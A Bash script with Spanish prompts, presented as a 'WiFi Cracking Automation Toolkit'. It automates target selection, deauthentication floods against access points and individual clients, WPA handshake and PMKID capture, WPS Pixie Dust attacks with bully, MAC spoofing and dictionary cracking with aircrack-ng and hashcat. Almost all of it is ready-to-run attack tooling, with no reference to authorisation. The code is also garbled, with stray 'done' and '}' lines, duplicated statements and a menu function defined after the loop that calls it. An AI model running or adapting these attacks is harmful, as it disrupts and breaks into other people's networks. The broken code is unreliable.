#!/bin/bash

# Colores para el output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # Sin Color

# Directorio de trabajo predeterminado
WORK_DIR="$(pwd)/capturas"
mkdir -p "$WORK_DIR"

if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[!] Por favor, ejecuta este script como root.${NC}"
  exit 1
fi

# Función de limpieza (Trap)
function cleanup() {
    echo ""
    echo -e "${YELLOW}[*] Interrupción detectada. Limpiando...${NC}"
    if [ ! -z "$mon_interface" ]; then
        if iw dev "$mon_interface" info 2>/dev/null | grep -q "type monitor"; then
             echo -e "${YELLOW}[*] Deteniendo modo monitor en $mon_interface...${NC}"
             airmon-ng stop "$mon_interface" > /dev/null 2>&1
        fi
    fi
    echo -e "${YELLOW}[*] Restaurando servicios de red...${NC}"
    service NetworkManager restart
    echo -e "${GREEN}[+] Salida limpia completada.${NC}"
    exit 0
}

# Capturar señales de salida (Ctrl+C, Exit)
trap cleanup SIGINT EXIT

function check_dependencies() {
    clear
    echo -e "${YELLOW}[*] Verificando dependencias del sistema...${NC}"
    echo "========================================="
    
    # Lista de herramientas críticas y sus paquetes correspondientes
    # Formato: "herramienta:paquete"
    dependencies=(
        "airmon-ng:aircrack-ng"
        "airodump-ng:aircrack-ng"
        "aireplay-ng:aircrack-ng"
        "aircrack-ng:aircrack-ng"
        "hashcat:hashcat"
        "iwconfig:wireless-tools"
        "iw:iw"
        "wget:wget"
        "wash:reaver"
        "bully:bully"
        "hcxdumptool:hcxtools"
        "macchanger:macchanger"
        "cowpatty:cowpatty"
    )

    for item in "${dependencies[@]}"; do
        tool="${item%%:*}"
        package="${item##*:}"

        if ! command -v "$tool" &> /dev/null; then
            echo -e "${RED}[!] La herramienta '$tool' no está instalada.${NC}"
            read -p "¿Deseas instalar el paquete '$package'? [S/n]: " choice
            choice=${choice:-S}
            
            if [[ "$choice" == "s" || "$choice" == "S" ]]; then
                echo -e "${YELLOW}[*] Actualizando e instalando $package...${NC}"
                apt-get update && apt-get install -y "$package"
                if ! command -v "$tool" &> /dev/null; then
                    echo -e "${RED}[!] Falló la instalación de $package. Saliendo...${NC}"
                    exit 1
                fi
                echo -e "${GREEN}[+] $package instalado correctamente.${NC}"
            else
                echo -e "${RED}[!] Se requiere '$tool' para continuar. Saliendo...${NC}"
                exit 1
            fi
        else
            echo -e "${GREEN}[OK] $tool encontrado.${NC}"
        fi
    done

    # Verificación opcional para hcxtools
    if ! command -v hcxpcapngtool &> /dev/null; then
        echo -e "${YELLOW}[INFO] 'hcxpcapngtool' no encontrado (útil para convertir .cap a hashcat).${NC}"
        read -p "¿Deseas instalar 'hcxtools' (opcional)? (s/n): " choice
        if [[ "$choice" == "s" || "$choice" == "S" ]]; then
             apt-get update && apt-get install -y hcxtools
        fi
    else
        echo -e "${GREEN}[OK] hcxpcapngtool encontrado.${NC}"
    fi

    echo -e "${GREEN}[*] Todas las dependencias están listas.${NC}"
    sleep 2
}

function banner() {
    clear
    echo -e "${GREEN}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║              WiFi Cracking Automation Toolkit            ║"
    echo "║                  Dev by: Lukas Otero                     ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

function show_loader() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    echo -ne " "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

function check_monitor_support() {
    local iface=$1
    if [ -z "$iface" ]; then return; fi

    echo -e "${YELLOW}[*] Verificando soporte de modo monitor para $iface...${NC}"

    # Obtener índice PHY
    local output=$(iw dev "$iface" info 2>/dev/null)
    local phy=$(echo "$output" | grep "wiphy" | awk '{print $2}')

    if [ -z "$phy" ]; then
        echo -e "${RED}[!] No se pudo obtener información del hardware para $iface.${NC}"
        # No bloqueamos, solo avisamos
        return
    fi

    # Verificar soporte en el hardware físico
    if iw phy "phy$phy" info 2>/dev/null | grep -q "monitor"; then
        echo -e "${GREEN}[OK] La interfaz soporta modo monitor.${NC}"
    else
        echo -e "${RED}[!] ALERTA: La interfaz '$iface' NO parece soportar modo monitor.${NC}"
        echo -e "${YELLOW}[!] Sin esto, el script fallará.${NC}"
        read -p "¿Deseas continuar de todos modos? (s/n): " choice
        if [[ "$choice" != "s" && "$choice" != "S" ]]; then exit 1; fi
    fi
}

function run_in_new_terminal() {
    local cmd="$1"
    local title="$2"
    
    echo -e "${YELLOW}[*] Abriendo ventana auxiliar para: $title...${NC}"
    
    # Intentar detectar emuladores de terminal comunes en Kali/Linux
    if command -v x-terminal-emulator > /dev/null 2>&1; then
        x-terminal-emulator -e "bash -c '$cmd; exec bash'" &
    elif command -v qterminal > /dev/null 2>&1; then
        qterminal -e "bash -c '$cmd; exec bash'" &
    elif command -v gnome-terminal > /dev/null 2>&1; then
        gnome-terminal -- bash -c "$cmd; exec bash" &
    elif command -v xfce4-terminal > /dev/null 2>&1; then
        xfce4-terminal -e "bash -c '$cmd; exec bash'" &
    elif command -v xterm > /dev/null 2>&1; then
        xterm -title "$title" -e "bash -c '$cmd; exec bash'" &
    else
        echo -e "${RED}[!] No se pudo abrir una nueva terminal automáticamente.${NC}"
        echo -e "${YELLOW}[*] Ejecutando en segundo plano (background)...${NC}"
        eval "$cmd" &
    fi
}

function get_wireless_interfaces() {
    iw dev | grep Interface | awk '{print $2}'
}

function is_monitor_mode() {
    local iface=$1
    iw dev "$iface" info | grep -q "type monitor"
}

function ensure_mon_interface() {
    if [ ! -z "$mon_interface" ] && is_monitor_mode "$mon_interface"; then
        return 0
    fi

    echo -e "${YELLOW}[*] Buscando interfaz en modo monitor...${NC}"
    
    for iface in $(get_wireless_interfaces); do
        if is_monitor_mode "$iface"; then
            mon_interface="$iface"
            echo -e "${GREEN}[+] Interfaz monitor detectada automáticamente: $mon_interface${NC}"
            return 0
        fi
    done
    
    done
    
    echo -e "${YELLOW}[*] No se detectó modo monitor. Intentando activar automáticamente...${NC}"
    for iface in $(get_wireless_interfaces); do
        echo -e "${YELLOW}[*] Activando airmon-ng en $iface...${NC}"
        
        airmon-ng check kill > /dev/null 2>&1
        
        airmon-ng start "$iface" > /dev/null 2>&1 &
        show_loader $!
        
        for new_iface in $(get_wireless_interfaces); do
            if is_monitor_mode "$new_iface"; then
                mon_interface="$new_iface"
                echo -e "\n${GREEN}[+] Modo monitor iniciado correctamente en: $mon_interface${NC}"
                return 0
            fi
        done
    done
    
    done
    
    echo -e "${RED}[!] No se pudo activar automáticamente.${NC}"
    read -p "Ingresa el nombre de la interfaz en modo monitor (ej. wlan0mon): " mon_interface
}

function start_monitor_mode() {
    ensure_mon_interface
    
    read -p "¿Deseas cambiar tu MAC a una aleatoria? (s/n): " ch_mac
    if [[ "$ch_mac" == "s" || "$ch_mac" == "S" ]]; then
        echo -e "${YELLOW}[*] Cambiando dirección MAC...${NC}"
        ifconfig "$mon_interface" down
        macchanger -r "$mon_interface"
        ifconfig "$mon_interface" up
    fi
}

function stop_monitor_mode() {
    banner
    read -p "Ingresa el nombre de la interfaz en modo monitor a detener (ej. wlan0mon): " mon_interface
    # La limpieza real se hará en el trap al salir, o podemos forzarla aquí.
    # Para ser consistentes con la opción de menú "Detener y Salir", simplemente salimos y dejamos que el trap actúe.
    exit 0
}

function scan_networks() {
    banner
    ensure_mon_interface
    echo -e "${YELLOW}[*] Iniciando escaneo de redes (Modo Monitor).${NC}"
    echo -e "${YELLOW}[*] Presiona CTRL+C para detener y volver al menú.${NC}"
    read -p "Presiona Enter para comenzar..."
    airodump-ng "$mon_interface"
}

function show_target_selection_menu() {
    local source_file="$1"
    
    echo -e "\n${YELLOW}╔════╤═══════════════════╤════╤═════════╤══════════╤══════════════════════╗${NC}"
    printf "${YELLOW}║${NC} %-2s ${YELLOW}│${NC} %-17s ${YELLOW}│${NC} %-2s ${YELLOW}│${NC} %-7s ${YELLOW}│${NC} %-8s ${YELLOW}│${NC} %-20s ${YELLOW}║${NC}\n" "ID" "BSSID" "CH" "PWR" "SEC" "ESSID"
    echo -e "${YELLOW}╠════╪═══════════════════╪════╪═════════╪══════════╪══════════════════════╣${NC}"
    
    local -a bssids
    local -a channels
    local -a essids
    local i=1
    
    # Leer archivo formateado: BSSID|CHANNEL|ESSID|POWER|SECURITY
    while IFS='|' read -r bssid channel essid pwr security; do
        if [[ -n "$bssid" ]]; then
             bssids[$i]="$bssid"
             channels[$i]="$channel"
             essids[$i]="$essid"
             
             # Colorear según intensidad de señal
             pwr_color="${GREEN}"
             if [[ "$pwr" -lt -70 ]]; then pwr_color="${YELLOW}"; fi
             if [[ "$pwr" -lt -85 ]]; then pwr_color="${RED}"; fi
             
             printf "${YELLOW}║${NC} %-2s ${YELLOW}│${NC} %-17s ${YELLOW}│${NC} %-2s ${YELLOW}│${NC} ${pwr_color}%-7s${NC} ${YELLOW}│${NC} %-8s ${YELLOW}│${NC} %-20.20s ${YELLOW}║${NC}\n" "$i" "$bssid" "$channel" "$pwr" "$security" "$essid"
             ((i++))
        fi
    done < "$source_file"
    
    echo -e "${YELLOW}╚════╧═══════════════════╧════╧═════════╧══════════╧══════════════════════╝${NC}"
    
    echo ""
    echo "0) Entrada Manual o Re-escanear"
    read -p "Selecciona el número de la red objetivo: " selection
    
    if [[ "$selection" == "0" ]]; then
        return 1
    elif [[ -n "${bssids[$selection]}" ]]; then
        TARGET_BSSID="${bssids[$selection]}"
        TARGET_CHANNEL="${channels[$selection]}"
        TARGET_ESSID="${essids[$selection]}"
        echo -e "${GREEN}[+] Seleccionado: $TARGET_ESSID ($TARGET_BSSID) [CH $TARGET_CHANNEL]${NC}"
        return 0
    else
        echo -e "${RED}[!] Selección inválida.${NC}"
        return 1
    fi
}

function start_scan_and_selection() {
    local mode="${1:-airodump}"
    local duration=15
    local tmp_scan_prefix="/tmp/wifi_scan"
    local formatted_list="/tmp/wifi_targets.list"
    
    rm -f "${tmp_scan_prefix}"* "$formatted_list"

    echo -e "${YELLOW}[*] Escaneando objetivos ($mode) por $duration segundos...${NC}"
    
    if [[ "$mode" == "wash" ]]; then
        wash -i "$mon_interface" -C > "${tmp_scan_prefix}.log" 2>&1 & 
        local pid=$!
    else
        airodump-ng --output-format csv -w "$tmp_scan_prefix" "$mon_interface" > /dev/null 2>&1 &
        local pid=$!
    fi
    
    for ((i=1; i<=duration; i++)); do
        echo -n "▓"
        sleep 1
    done
    echo ""
    
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
    
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
    
    if [[ "$mode" == "wash" ]]; then
        # Parsear salida de Wash (WPS)
        # BSSID Ch RSSI WPS Lck ESSID
        grep -E "^[0-9A-F]{2}:" "${tmp_scan_prefix}.log" | awk '{
            essid=""; for(i=6;i<=NF;i++) essid=essid $i " ";
            rssi=$3
            if (length(essid) < 2) essid="<Oculta>";
            # Wash output format assumed: BSSID|CHANNEL|ESSID|POWER|SECURITY
            print $1 "|" $2 "|" essid "|" $3 "|" "WPS"
        }' | sort -t'|' -k4 -nr > "$formatted_list"
        
    else
        local csv_file="${tmp_scan_prefix}-01.csv"
        if [ ! -f "$csv_file" ]; then return 1; fi
        
        # Airodump CSV columns: BSSID(1)..CH(4)..Privacy(6)..Power(9)..ESSID(14)
        awk -F, 'NR>1 && $1!="" && $1!~/Station MAC/ {
            for(i=1; i<=NF; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i);
            
            bssid=$1
            chan=$4
            priv=$6
            pwr=$9
            essid=$14
            
            if(length(essid)==0) essid="<Oculta>";
            if(length(priv)==0) priv="OPEN";
            
            # Formato: BSSID|CHANNEL|ESSID|POWER|SECURITY
            if(length(bssid)==17) print bssid "|" chan "|" essid "|" pwr "|" priv
        }' "$csv_file" | sort -t'|' -k4 -nr > "$formatted_list"
    fi
    
    if [ -s "$formatted_list" ]; then
        show_target_selection_menu "$formatted_list"
        return $?
    else
        echo -e "${RED}[!] No se encontraron redes.${NC}"
        return 1
    fi
}

function capture_handshake() {
    banner
    ensure_mon_interface
    
    # Escaneo modular
    start_scan_and_selection "airodump"
    if [ $? -eq 0 ]; then
        bssid="$TARGET_BSSID"
        channel="$TARGET_CHANNEL"
        default_name=$(echo "$TARGET_ESSID" | sed 's/ /_/g')
        read -p "Nombre para el archivo de captura (Enter para '$default_name'): " filename
        if [ -z "$filename" ]; then filename="$default_name"; fi
    else
        echo -e "${YELLOW}[!] Pasando a modo manual...${NC}"
        read -p "Ingresa el BSSID del objetivo: " bssid
        read -p "Ingresa el CANAL del objetivo: " channel
        read -p "Ingresa un nombre para el archivo de captura: " filename
    fi
    
    full_cap_path="$WORK_DIR/$filename"
    
    full_cap_path="$WORK_DIR/$filename"
    
    echo -e "${YELLOW}[*] Iniciando captura en canal $channel...${NC}"
    
    airodump_cmd="airodump-ng -c $channel --bssid $bssid -w $full_cap_path $mon_interface"
    run_in_new_terminal "$airodump_cmd" "Capturando Handshake - $bssid"
    
    echo -e "${YELLOW}[*] Esperando 5 segundos...${NC}"
    sleep 5
    
    while true; do
        echo -e "\n${RED}[ATTACK] Deauth masivo...${NC}"
        aireplay-ng -0 5 -a "$bssid" "$mon_interface"
        
        read -p "¿Capturado? (s/n): " captured
        if [[ "$captured" == "s" || "$captured" == "S" ]]; then
            pkill -f "airodump-ng.*$bssid"
            if aircrack-ng -b "$bssid" "$full_cap_path-01.cap" 2>&1 | grep -q "1 handshake"; then
                 echo -e "${GREEN}[OK] Handshake VÁLIDO.${NC}"
                 read -p "¿Crackear ahora? (s/n): " crack_now
                 if [[ "$crack_now" == "s" || "$crack_now" == "S" ]]; then
                     crack_password_auto "$full_cap_path-01.cap" "$bssid"
                 fi
            else
                 echo -e "${RED}[!] Handshake inválido.${NC}"
            fi
            break
        else
            echo -e "${YELLOW}[*] Reintentando ataque en 2 segundos...${NC}"
            sleep 2
        fi
    done
}

function deauth_attack() {
    banner
    ensure_mon_interface
    
    echo -e "${YELLOW}[*] Selecciona el AP Objetivo para el ataque...${NC}"
    start_scan_and_selection "airodump"
    if [ $? -ne 0 ]; then
        echo -e "${RED}[!] No se seleccionó ningún objetivo.${NC}"
        read -p "Presiona Enter para volver..."
        return
    fi
    
    local target_bssid="$TARGET_BSSID"
    local target_ch="$TARGET_CHANNEL"
    local target_essid="$TARGET_ESSID"
    
    while true; do
        clear
        banner
        echo -e "${YELLOW}╔══════════════════ DEAUTH MENU ═══════════════════╗${NC}"
        clear
        banner
        echo -e "${YELLOW}╔══════════════════ DEAUTH MENU ═══════════════════╗${NC}"
        local disp_essid=$(echo "$target_essid" | cut -c 1-18)
        
        printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" "Target: $disp_essid ($target_bssid)"
        printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" "Channel: $target_ch"
        echo -e "${YELLOW}╠══════════════════════════════════════════════════╣${NC}"
        printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 1) Ataque Masivo (Broadcast - 15 pkts)"
        printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 2) Ataque Particular (Buscar Clientes)"
        printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 3) Volver"
        echo -e "${YELLOW}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        read -p "Opción: " d_opt
        
        case $d_opt in
            1)
                echo -e "${YELLOW}[*] Preparando ataque masivo a $target_bssid...${NC}"
                iwconfig "$mon_interface" channel "$target_ch"
                echo -e "${YELLOW}[*] Enviando 15 paquetes de desautenticación (Broadcast)...${NC}"
                aireplay-ng -0 15 -a "$target_bssid" "$mon_interface"
                echo -e "${GREEN}[+] Ataque finalizado.${NC}"
                read -p "Presiona Enter para continuar..."
                ;;
            2)
                echo -e "${YELLOW}[*] Monitoreando clientes en $target_bssid (Canal $target_ch)...${NC}"
                echo -e "${YELLOW}[*] Espere 25 segundos para detectar tráfico...${NC}"
                
                local client_scan_prefix="/tmp/wifi_clients_scan"
                rm -f "${client_scan_prefix}"*
                
                # Iniciar airodump filtrado por BSSID y Canal
                airodump-ng -c "$target_ch" --bssid "$target_bssid" -w "$client_scan_prefix" --output-format csv "$mon_interface" > /dev/null 2>&1 &
                local scan_pid=$!
                
                # Barra de progreso
                for ((i=1; i<=25; i++)); do
                    echo -n "▓"
                    sleep 1
                done
                echo ""
                
                kill $scan_pid 2>/dev/null
                wait $scan_pid 2>/dev/null
                
                local csv_file="${client_scan_prefix}-01.csv"
                
                local csv_file="${client_scan_prefix}-01.csv"
                
                if [ ! -f "$csv_file" ]; then
                    echo -e "${RED}[!] Error: No se generó archivo de captura.${NC}"
                else
                    echo -e "\n${YELLOW}--- Clientes Detectados ---${NC}"
                    local count=0
                    local -a client_macs
                    
                    while IFS=',' read -r col1 col2 col3 col4 col5 col6 rest; do
                        col1=$(echo "$col1" | tr -d '[:space:]')
                        
                        if [[ "$col1" == "StationMAC" ]]; then
                            in_stations=1
                            continue
                        fi
                        
                        if [[ "$in_stations" == "1" && "$col1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                             count=$((count+1))
                             client_macs[$count]="$col1"
                             power=$(echo "$col4" | tr -d '[:space:]')
                             packets=$(echo "$col6" | tr -d '[:space:]')
                             
                             echo -e "$count) MAC: ${GREEN}$col1${NC} | Pwr: $power | Pkts: $packets"
                        fi
                    done < "$csv_file"
                    
                    if [ "$count" -eq 0 ]; then
                        echo -e "${RED}[!] No se encontraron clientes conectados durante el escaneo.${NC}"
                    else
                        echo ""
                        read -p "Selecciona el número del cliente a atacar: " c_sel
                        if [[ "$c_sel" -gt 0 && "$c_sel" -le "$count" ]]; then
                            target_client="${client_macs[$c_sel]}"
                            echo -e "${YELLOW}[*] Atacando a cliente: $target_client${NC}"
                            iwconfig "$mon_interface" channel "$target_ch"
                            aireplay-ng -0 15 -a "$target_bssid" -c "$target_client" "$mon_interface"
                            echo -e "${GREEN}[+] Ataque particular finalizado.${NC}"
                        else
                            echo -e "${RED}[!] Selección inválida.${NC}"
                        fi
                    fi
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            3) return ;;
            *) echo "Opción inválida." ;;
        esac
    done
}

function wps_attack() {
    banner
    ensure_mon_interface

    echo -e "${YELLOW}[*] Ataque WPS (Pixie Dust)${NC}"

    # Escaneo Modular (modo wash)
    start_scan_and_selection "wash"
    if [ $? -eq 0 ]; then
        bssid="$TARGET_BSSID"
        channel="$TARGET_CHANNEL"
    else
        echo -e "${YELLOW}[!] Pasando a modo manual...${NC}"
        read -p "Ingresa el BSSID del objetivo: " bssid
        read -p "Ingresa el Canal (CH): " channel
    fi
    
    echo -e "${YELLOW}[*] Iniciando ataque con Bully...${NC}"
    bully -b "$bssid" -c "$channel" -d -v 3 "$mon_interface"
    
    read -p "Presiona Enter para continuar..."
}

function pmkid_attack() {
    banner
    ensure_mon_interface
    
    ensure_mon_interface
    
    echo -e "${YELLOW}[*] Ataque PMKID (Client-less)${NC}"
    
    start_scan_and_selection "airodump"
    if [ $? -eq 0 ]; then
        target_bssid="$TARGET_BSSID"
    else
        read -p "Ingresa el BSSID del objetivo (o vacío para TODO): " target_bssid
    fi

    read -p "Tiempo de captura en segundos (ej. 60): " capture_time
    dump_file="$WORK_DIR/pmkid_capture_$(date +%s).pcapng"
    
    echo -e "${YELLOW}[*] Capturando PMKID...${NC}"
    
    F_OPT=""
    if [ ! -z "$target_bssid" ]; then
        echo "$target_bssid" | sed 's/://g' > filter.txt
        F_OPT="--filterlist_ap=filter.txt --enable_status=1"
    fi
    
    timeout "$capture_time" hcxdumptool -i "$mon_interface" -w "$dump_file" $F_OPT
    
    echo -e "\n${GREEN}[+] Captura finalizada.${NC}"
    
    if [ -f "$dump_file" ]; then
        hcxpcapngtool -o "${dump_file}.hc22000" "$dump_file"
        
        if [ -f "${dump_file}.hc22000" ]; then
            echo -e "${GREEN}[!!!] Hashes PMKID extraídos.${NC}"
            read -p "¿Crackear ahora? (s/n): " crack_now
            if [[ "$crack_now" == "s" || "$crack_now" == "S" ]]; then
                 crack_password_auto "${dump_file}.hc22000" "PMKID"
            fi
        else
            echo -e "${RED}[!] No se encontraron PMKIDs.${NC}"
        fi
    else
        echo -e "${RED}[!] Error en captura.${NC}"
    fi
    
    read -p "Presiona Enter para continuar..."
}

function crack_password_auto() {
    local cap_file_input="$1"
    local bssid_input="$2"
    
    echo -e "${YELLOW}[*] Configuración rápida de cracking...${NC}"
    
    
    echo -e "${YELLOW}[*] Configuración rápida de cracking...${NC}"
    
    wordlist=""
    if [ -f "$WORK_DIR/rockyou.txt" ]; then
        wordlist="$WORK_DIR/rockyou.txt"
    elif [ -f "/usr/share/wordlists/rockyou.txt" ]; then
        wordlist="/usr/share/wordlists/rockyou.txt"
    else
        echo -e "${RED}[!] No se encontró rockyou.txt automáticmente. Usando selección manual...${NC}"
        crack_password
        return
    fi
    
    echo -e "${GREEN}[*] Usando diccionario: $wordlist${NC}"
    
    # Decidir herramienta basado en extensión o tipo
    if [[ "$cap_file_input" == *.hc22000 ]]; then
        echo -e "${YELLOW}[*] Detectado Hashcat Mode (PMKID/Converted). Usando GPU...${NC}"
        hashcat -a 0 -m 22000 -w 3 "$cap_file_input" "$wordlist"
    else
        echo -e "${YELLOW}[*] Detectado Aircrack-ng Mode (Handshake). Usando CPU...${NC}"
        aircrack-ng -a2 -b "$bssid_input" -w "$wordlist" "$cap_file_input"
    fi
    read -p "Presiona Enter para continuar..."
}

function verify_handshake() {
    banner
    echo -e "${YELLOW}[*] Verificar integridad del Handshake${NC}"
    
    while true; do
        read -p "Ingresa la ruta del archivo .cap: " cap_file
        if [ -f "$cap_file" ]; then break; else echo -e "${RED}[!] Archivo no encontrado.${NC}"; fi
    done
    
    read -p "Ingresa el BSSID (opcional, Enter para omitir): " bssid
    
    echo -e "${YELLOW}[*] Analizando archivo con cowpatty...${NC}"
    
    echo -e "${YELLOW}[*] Analizando archivo con cowpatty...${NC}"
    
    if [ -z "$bssid" ]; then
        cowpatty -c -r "$cap_file"
    else
        echo -e "${YELLOW}[*] Usando aircrack-ng para validar handshake de $bssid...${NC}"
        output=$(aircrack-ng -b "$bssid" "$cap_file" 2>&1)
        if echo "$output" | grep -q "1 handshake"; then
             echo -e "${GREEN}[OK] Handshake VÁLIDO encontrado para $bssid.${NC}"
        else
             echo -e "${RED}[!] NO se detectó un handshake válido o completo.${NC}"
             echo "Salida de aircrack-ng:"
             echo "$output" | grep -E "handshake|No valid packets"
        fi
    fi
     
    read -p "Presiona Enter para continuar..."
}

function crack_password() {
    banner
    echo -e "${YELLOW}[*] Configuración del ataque de diccionario${NC}"
    
    # 1. Selección de Diccionario
    while true; do
        echo -e "\n${YELLOW}--- Selección de Diccionario ---${NC}"
        echo "1) Ingresar ruta manual"
        echo "2) Usar RockYou (Buscar en /usr/share/wordlists/)"
        echo "3) Descargar RockYou (desde GitHub)"
        read -p "Opción: " wl_choice

        case $wl_choice in
            1)
                read -p "Ruta del archivo: " wordlist
                if [ -f "$wordlist" ]; then break; else echo -e "${RED}[!] Archivo no encontrado.${NC}"; fi
                ;;
            2)
                # Intentar localizar rockyou en rutas comunes
                locations=(
                    "/usr/share/wordlists/rockyou.txt"
                    "/usr/share/wordlists/rockyou.txt.gz"
                )
                found=0
                for loc in "${locations[@]}"; do
                    if [ -f "$loc" ]; then
                        if [[ "$loc" == *.gz ]]; then
                            echo -e "${YELLOW}[*] Descomprimiendo $loc...${NC}"
                            gunzip -c "$loc" > "$WORK_DIR/rockyou.txt"
                            wordlist="$WORK_DIR/rockyou.txt"
                        else
                            wordlist="$loc"
                        fi
                        echo -e "${GREEN}[+] Diccionario seleccionado: $wordlist${NC}"
                        found=1
                        break
                    fi
                done
                
                if [ $found -eq 1 ]; then break; else echo -e "${RED}[!] RockYou no encontrado en rutas estándar.${NC}"; fi
                ;;
            3)
                wordlist="$WORK_DIR/rockyou.txt"
                echo -e "${YELLOW}[*] Descargando RockYou.txt...${NC}"
                if wget -q --show-progress -O "$wordlist" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt; then
                    echo -e "${GREEN}[+] Descarga completada: $wordlist${NC}"
                    break
                else
                    echo -e "${RED}[!] Error al descargar. Verifica tu conexión.${NC}"
                fi
                ;;
            *) echo "Opción inválida." ;;
        esac
    done

    # 2. Pedir archivo de captura (.cap)
    while true; do
        read -p "Ingresa la ruta del archivo de captura (.cap): " cap_file
        if [ -f "$cap_file" ]; then
            break
        else
            echo -e "${RED}[!] El archivo no existe. Intenta de nuevo.${NC}"
        fi
    done

    # 3. Menú de recursos
    echo ""
    echo "Selecciona el recurso para crackear:"
    echo "1) CPU (Aircrack-ng - Estándar)"
    echo "2) GPU (Hashcat - Alto Rendimiento)"
    read -p "Opción: " resource_opt

    case $resource_opt in
        1)
            echo -e "${YELLOW}[*] Necesitamos el BSSID para filtrar el ataque.${NC}"
            read -p "Ingresa el BSSID del objetivo: " bssid
            
            echo -e "${YELLOW}[*] Iniciando aircrack-ng con CPU...${NC}"
            echo -e "${RED}[!] IMPORTANTE: Solo funcionará si la contraseña está en tu diccionario.${NC}"
            aircrack-ng -a2 -b "$bssid" -w "$wordlist" "$cap_file"
            ;;
        2)
            echo -e "${YELLOW}[*] Preparando ataque con GPU (Hashcat)...${NC}"
            
            # Lógica de conversión
            hash_file=""
            if command -v hcxpcapngtool &> /dev/null; then
                 echo -e "${GREEN}[*] Herramienta 'hcxpcapngtool' detectada.${NC}"
                 output_hc="${cap_file%.*}.hc22000"
                 
                 echo -e "${YELLOW}[*] Convirtiendo .cap a formato hashcat (.hc22000)...${NC}"
                 hcxpcapngtool -o "$output_hc" "$cap_file"
                 
                 if [ -f "$output_hc" ]; then
                     echo -e "${GREEN}[+] Conversión exitosa: $output_hc${NC}"
                     hash_file="$output_hc"
                 else
                     echo -e "${RED}[!] Falló la conversión automática.${NC}"
                 fi
            else
                 echo -e "${YELLOW}[!] No se encontró 'hcxpcapngtool' para conversión automática.${NC}"
                 echo -e "${YELLOW}[!] Necesitas convertir el archivo .cap a .hc22000 manualmente (ej. https://hashcat.net/cap2hashcat/).${NC}"
            fi

            if [ -z "$hash_file" ]; then
                while true; do
                    read -p "Ingresa la ruta del archivo convertido (.hc22000): " hash_file
                    if [ -f "$hash_file" ]; then
                        break
                    else
                         echo -e "${RED}[!] Archivo no encontrado.${NC}"
                    fi
                done
            fi
            
            echo -e "${YELLOW}[*] Iniciando hashcat (Modo 22000)...${NC}"
            hashcat -a 0 -m 22000 -w 3 "$hash_file" "$wordlist"
            ;;
        *)
            echo "Opción inválida."
            ;;
    esac
    read -p "Presiona Enter para continuar..."
}

}

check_dependencies

while true; do
    banner
    echo -e "${YELLOW}╔══════════════════ ATTACK MENU ═══════════════════╗${NC}"
    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 1) Ataque WPA/WPA2 Clásico (Handshake)"
    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 2) Ataque WPS (Pixie Dust)"
    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 3) Ataque PMKID (Client-less)"
    echo -e "${YELLOW}╠══════════════════════════════════════════════════╣${NC}"
    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 4) Herramientas Extra (Crackear, Tests)"
    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 5) Detener Modo Monitor y Salir"
    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 6) Salir"
    echo -e "${YELLOW}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
    read -p "Selecciona una opción: " option
    
    case $option in
        1) capture_handshake ;;
        2) wps_attack ;;
        3) pmkid_attack ;;
        4) extra_tools_menu ;;
        5) exit 0 ;; # El trap manejará la detención
        6) exit 0 ;;
        *) echo -e "${RED}Opción inválida${NC}"; sleep 1 ;;
    esac
done

function extra_tools_menu() {
    clear
    banner
    echo -e "${YELLOW}╔══════════════════ EXTRA TOOLS ═══════════════════╗${NC}"
    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 1) Escanear Redes (airodump-ng)"
    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 2) Ataque Desautenticación Manual"
    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 3) Verificar Handshake (.cap)"
    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 4) Crackear Contraseña (Manual)"
    echo -e "${YELLOW}╠══════════════════════════════════════════════════╣${NC}"
    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 5) Volver"
    echo -e "${YELLOW}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
    read -p "Opción: " ext_opt
    case $ext_opt in
        1) scan_networks ;;
        2) deauth_attack ;;
        3) verify_handshake ;;
        4) crack_password ;;
        5) return ;;
    esac
}
